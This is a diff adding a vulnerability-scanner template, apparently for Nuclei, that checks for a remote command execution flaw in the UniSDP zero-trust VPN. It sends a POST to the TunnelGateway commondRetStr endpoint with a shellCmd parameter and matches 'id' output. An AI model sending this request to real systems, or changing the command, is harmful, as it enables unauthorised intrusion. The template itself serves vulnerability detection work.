@@ -1,0 +1,29 @@
+id: unisdp-vpn-rce
+
+info:
+  name: UniSDP commondRetSt RCE
+  author: zan8in
+  severity: critical
+  description: |
+    联软安界UniSDP软件定义边界系统是基于零信任的下一代VPN，该系统2021.04.28版本中TunnelGateway某接口存在安全漏洞，漏洞允许攻击者将特制请求发送到服务器并远程命令执行。
+    title="UniSSOView"
+  tags: 联软安界UniSDP
+
+http:
+  - raw:
+      - |
+        POST /TunnelGateway/commondRetStr HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        shellCmd=id
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - 'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)'
+        part: body
